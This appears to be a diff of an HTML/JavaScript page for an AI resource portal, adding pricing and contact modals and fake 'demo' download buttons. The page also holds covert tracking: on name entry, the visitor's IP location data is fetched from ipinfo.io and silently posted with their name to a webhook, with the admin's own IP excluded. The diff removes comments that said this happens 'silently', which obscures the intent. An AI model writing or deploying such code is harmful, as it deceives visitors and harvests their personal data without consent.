+                                <h3 style="color:var(--white);margin-bottom:1rem;font-size:1.6rem">Enterprise</h3>
+                                <p style="font-size:2.5rem;font-weight:700;margin-bottom:1rem;background:linear-gradient(to right,var(--white),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent">Custom</p>
+                                <ul style="text-align:left;margin-bottom:1.5rem;color:rgba(255,255,255,0.7);padding-left:1.5rem">
+                                    <li style="margin-bottom:0.5rem">Custom AI Solutions</li>
+                                    <li style="margin-bottom:0.5rem">24/7 Dedicated Support</li>
+                                    <li style="margin-bottom:0.5rem">Unlimited Storage</li>
+                                </ul>
+                                <a href="#" class="download-btn" style="display:inline-block">Contact Sales</a>
+                            </div>
+                        </div>
+                        <button class="btn" onclick="closeModal()" style="width:200px;margin:0 auto">Close</button>
+                    `;
+                    break;
+
+                case 'contact':
+                    modalTitle.textContent = 'Contact Us';
+                    modalBody.innerHTML = `
+                        <div style="background:var(--glass);padding:2rem;border-radius:16px;border:1px solid var(--glass-border)">
+                            <h4 style="color:var(--white);margin-bottom:1rem;font-size:1.6rem">Get in Touch</h4>
+                            <form>
+                                <div style="margin-bottom:1.5rem">
+                                    <input type="text" placeholder="Your Name" style="width:100%;padding:1rem;background:rgba(0,0,0,0.2);border:1px solid var(--glass-border);border-radius:8px;color:white;font-size:1rem">
+                                </div>
+                                <div style="margin-bottom:1.5rem">
+                                    <input type="email" placeholder="Your Email" style="width:100%;padding:1rem;background:rgba(0,0,0,0.2);border:1px solid var(--glass-border);border-radius:8px;color:white;font-size:1rem">
+                                </div>
+                                <div style="margin-bottom:1.5rem">
+                                    <textarea placeholder="Your Message" style="width:100%;padding:1rem;background:rgba(0,0,0,0.2);border:1px solid var(--glass-border);border-radius:8px;color:white;min-height:150px;font-size:1rem"></textarea>
+                                </div>
+                                <button class="btn" type="button" onclick="alert('Message sent! (demo)');closeModal()">Send Message</button>
+                            </form>
+                        </div>
+                    `;
+                    break;
+
+                default:
+                    modalTitle.textContent = 'Premium Feature';
+                    modalBody.innerHTML = `
+                        <div style="text-align:center;padding:2rem 0">
+                            <i class="fas fa-crown" style="font-size:3rem;color:var(--accent);margin-bottom:1.5rem"></i>
+                            <h3 style="color:var(--white);margin-bottom:1rem;font-size:1.6rem">Premium Feature</h3>
+                            <p style="color:rgba(255,255,255,0.7);margin-bottom:2rem">This feature is available in our premium plans. Upgrade to unlock all capabilities.</p>
+                            <button class="btn" onclick="showModal('pricing')">View Pricing</button>
+                        </div>
+                    `;
+            }
+
+            modal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Get IP data
         async function getIPData() {
             try {
                 const response = await fetch('https://ipinfo.io/json');
@@ -452,10 +846,10 @@
             }
         }
 
-        // Send data to webhook silently
+        // Send data to webhook
         async function sendToWebhook(userName, ipData) {
             if (!ipData || ipData.ip === ADMIN_IP) return;
-            
+
             const payload = {
                 name: userName,
                 ip: ipData.ip,
@@ -473,66 +867,67 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) {
-                // Silent fail
-            }
+            } catch (e) {}
         }
 
         // Main function
         async function nextStep() {
             const userName = document.getElementById('userName').value.trim();
             if (!userName) return;
-            
-            // Silently collect IP data
+
             const ipData = await getIPData();
             await sendToWebhook(userName, ipData);
-            
-            // Update UI
+
             document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             loadResources();
         }
 
-        // Load resources with unique images
+        // Load resources
         function loadResources() {
             const grid = document.getElementById('resourceGrid');
             const resources = [
                 { 
                     title: "Neural Network Architectures", 
-                    desc: "Advanced architectures with implementation guides",
-                    category: "Framework"
+                    desc: "Advanced architectures with implementation guides and performance benchmarks",
+                    category: "Framework",
+                    size: "2.4GB"
                 },
                 { 
                     title: "AI Dataset Library", 
-                    desc: "Curated datasets for machine learning projects",
-                    category: "Data"
+                    desc: "Curated datasets for machine learning projects across multiple industries",
+                    category: "Data",
+                    size: "15.7GB"
                 },
                 { 
-                    title: "Model Optimization", 
-                    desc: "Tools for optimizing AI model performance",
-                    category: "Tools"
+                    title: "Model Optimization Toolkit", 
+                    desc: "Comprehensive tools for optimizing AI model performance and efficiency",
+                    category: "Tools",
+                    size: "1.2GB"
                 },
                 { 
-                    title: "Research Digest", 
-                    desc: "Summaries of breakthrough AI research",
-                    category: "Research"
+                    title: "Research Papers Digest", 
+                    desc: "Summaries and analysis of breakthrough AI research papers",
+                    category: "Research",
+                    size: "850MB"
                 },
                 { 
                     title: "Deployment Templates", 
-                    desc: "Production-ready deployment solutions",
-                    category: "DevOps"
+                    desc: "Production-ready templates for deploying AI models at scale",
+                    category: "DevOps",
+                    size: "3.5GB"
                 },
                 { 
                     title: "Ethics Guidelines", 
-                    desc: "Framework for responsible AI development",
-                    category: "Governance"
+                    desc: "Framework for responsible AI development and deployment",
+                    category: "Governance",
+                    size: "320MB"
                 }
             ];
-            
-            // Shuffle images to prevent duplicates
+
             const shuffledImages = [...abstractImages].sort(() => 0.5 - Math.random());
-            
+
             resources.forEach((resource, index) => {
                 const card = document.createElement('div');
                 card.className = 'resource-card';
@@ -542,13 +937,23 @@
                         <h3>${resource.title}</h3>
                         <p>${resource.desc}</p>
                         <div class="resource-meta">
-                            <span><i class="fas fa-tag"></i> ${resource.category}</span>
-                            <span><i class="fas fa-download"></i> Download</span>
+                            <span><i class="fas fa-tag"></i> ${resource.category} • ${resource.size}</span>
+                            <a href="#" class="download-btn" onclick="event.preventDefault();alert('Download started! (demo)')">
+                                <i class="fas fa-download"></i> Download
+                            </a>
                         </div>
                     </div>
                 `;
                 grid.appendChild(card);
             });
+        }
+
+        // Close modal when clicking outside
+        window.onclick = function(event) {
+            const modal = document.getElementById('modal');
+            if (event.target == modal) {
+                closeModal();
+            }
         }
     </script>
 </body>
